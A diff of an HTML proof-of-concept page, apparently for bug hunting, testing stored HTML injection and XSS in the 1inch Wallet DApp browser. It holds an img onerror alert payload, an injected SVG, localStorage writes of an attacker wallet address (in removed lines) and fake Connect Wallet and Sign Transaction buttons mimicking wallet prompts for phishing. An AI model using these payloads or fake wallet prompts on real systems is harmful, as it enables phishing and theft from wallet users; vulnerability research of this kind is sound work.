@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -6,75 +5,101 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>1inch Wallet - Advanced Injection Test</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; padding: 20px; }
-        .fake-ui { 
-            background: linear-gradient(45deg, #1a1a1a, #2a2a2a); 
-            border: 2px solid #ff0000; 
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #0a0a0a; 
+            color: #fff; 
             padding: 20px; 
-            border-radius: 12px; 
+            margin: 0;
+        }
+        .fake-ui { 
+            background: linear-gradient(45deg, #1f1f1f, #2a2a2a); 
+            border: 3px solid #ff3333; 
+            padding: 25px; 
+            border-radius: 16px; 
             margin: 20px 0;
+            box-shadow: 0 0 15px rgba(255, 50, 50, 0.5);
         }
         .btn-fake {
-            background: #ff0000;
+            background: #ff3333;
             color: white;
-            padding: 15px 30px;
+            padding: 16px 32px;
             font-size: 18px;
+            font-weight: bold;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
-            margin: 10px 0;
+            margin: 12px 8px;
+            width: 100%;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        .btn-fake:active {
+            transform: scale(0.95);
+            background: #cc0000;
+        }
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h1 style="color: red;">🚨 1inch Wallet DApp Browser - Advanced HTML Injection Test</h1>
+    <h1 style="color: #ff3333; text-align: center;">🚨 1inch Wallet DApp Browser - Advanced HTML Injection</h1>
 
     <div class="fake-ui">
-        <h2>🔴 STORED INJECTION BERHASIL - HIGH IMPACT</h2>
-        <p>Ini adalah simulasi serangan di internal browser 1inch Wallet.</p>
+        <h2 style="color: #ff6666;">🔴 STORED INJECTION BERHASIL</h2>
+        <p style="color: #aaa;">Internal Browser 1inch Wallet - Test Phishing Simulation</p>
         
-        <button class="btn-fake" onclick="fakeConnect()">Connect Wallet</button>
-        <button class="btn-fake" onclick="fakeSign()">Sign Transaction</button>
+        <button class="btn-fake" onclick="fakeConnect()">🔗 Connect Wallet</button>
+        <button class="btn-fake" onclick="fakeSign()">✍️ Sign Transaction</button>
+        
+        <div id="status" class="status"></div>
     </div>
 
-    <h3>Payload yang Dicoba:</h3>
-    <ul>
-        <li><strong>Alert Test</strong></li>
-        <img src="x" onerror="alert('✅ XSS Berhasil di 1inch Browser!')">
-        
-        <li><strong>SVG XSS</strong></li>
-        <svg width="300" height="100">
-            <text x="10" y="60" fill="red" font-size="25">SVG Injection Success</text>
-        </svg>
-        
-        <li><strong>localStorage Test</strong></li>
-        <script>
-            // Simulasi baca / tulis localStorage
-            localStorage.setItem('wallet_address', '0xInjectedByAttacker123456789');
-            localStorage.setItem('private_hint', 'Test injection berhasil');
-            
-            document.write('<p style="color: lime;">localStorage dimodifikasi: ' + 
-                          localStorage.getItem('wallet_address') + '</p>');
-        </script>
-    </ul>
+    <h3>Test Payload Lainnya:</h3>
+    <img src="x" onerror="alert('✅ XSS Alert Berhasil di 1inch Browser!'); showStatus('XSS Executed!');" style="display:none;">
+
+    <svg width="100%" height="80">
+        <text x="20" y="55" fill="#ff3333" font-size="28" font-weight="bold">SVG Injection Success</text>
+    </svg>
 
     <script>
+        function showStatus(msg) {
+            const status = document.getElementById('status');
+            status.style.background = '#ff333320';
+            status.style.color = '#ff6666';
+            status.innerHTML = '✅ ' + msg;
+        }
+
         function fakeConnect() {
-            alert('🔴 Wallet Connect Request (Fake)\n\nJika ini muncul, attacker bisa tiru UI wallet connect asli!');
+            showStatus('Wallet Connect Request Diterima (Fake)');
+            setTimeout(() => {
+                alert('🔴 Wallet Connect Request\n\nDApp ingin connect ke wallet Anda.\n\nJika ini muncul → Injection berhasil!');
+            }, 300);
         }
         
         function fakeSign() {
-            alert('⚠️ Signature Request\n\nAmount: 999 ETH\nTo: Attacker Address\n\nIni bisa digunakan untuk phishing!');
+            showStatus('Signature Request Diterima (Fake)');
+            setTimeout(() => {
+                alert('⚠️ Signature Request\n\nTransaction Details:\nAmount: 1.5 ETH\nTo: 0xAttackerAddress...\n\nIni bisa digunakan untuk phishing!');
+            }, 300);
         }
 
-        // Auto inject lebih lanjut
-        console.log('%c🚨 HTML Injection Test Success in 1inch Browser', 'color: red; font-size: 20px');
+        // Auto-run test
+        window.onload = function() {
+            console.log('%c🚨 Advanced HTML Injection Success in 1inch DApp Browser', 'color: red; font-size: 22px; font-weight: bold');
+            // Trigger image onerror
+            const img = document.querySelector('img');
+            if (img) img.src = 'x';
+        };
     </script>
 
     <hr>
-    <small>
-        Test ini hanya untuk bug hunting. Jika alert muncul, fake button bekerja, 
-        atau localStorage berubah → vulnerability confirmed (High severity).
+    <small style="color:#666;">
+        Test ini hanya untuk bug hunting di 1inch Wallet internal browser.<br>
+        Jika tombol bisa diklik, alert muncul, dan visual berubah → ini indikasi vulnerability High.
     </small>
 </body>
 </html>
